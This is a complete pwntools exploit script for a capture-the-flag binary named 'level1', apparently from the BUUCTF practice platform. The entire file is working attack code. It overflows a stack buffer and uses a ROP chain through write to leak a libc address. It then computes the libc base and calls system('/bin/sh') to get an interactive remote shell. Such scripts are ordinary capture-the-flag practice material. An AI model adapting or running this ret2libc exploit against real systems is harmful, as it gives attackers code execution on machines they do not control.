#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or "level1")
libc = ELF("libc-2.23.so")

host = args.HOST or "node4.buuoj.cn"
port = int(args.PORT or 26415)


def start_local(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


def start_remote(argv=[], *a, **kw):
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io


def start(argv=[], *a, **kw):
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)


gdbscript = """
b *0x80484b1
continue
""".format(
    **locals()
)

io = start()
io.clean()

p = b"\x90" * 140
p += p32(exe.plt.write)
p += p32(exe.sym.main)
p += p32(0x1)
p += p32(exe.got.write)
p += p32(0x4)

io.sendline(p)
leak = u32(io.recv()[:4])
libc.address = leak - libc.sym.write
bin_sh = next(libc.search(b"/bin/sh\x00"))
success(f"[libc] {hex(libc.address)}")
success(f"[bin_sh] {hex(bin_sh)}")

p = b"\x90" * 140
p += p32(libc.sym.system)
p += p32(exe.sym.main)
p += p32(bin_sh)

io.sendline(p)
io.interactive()
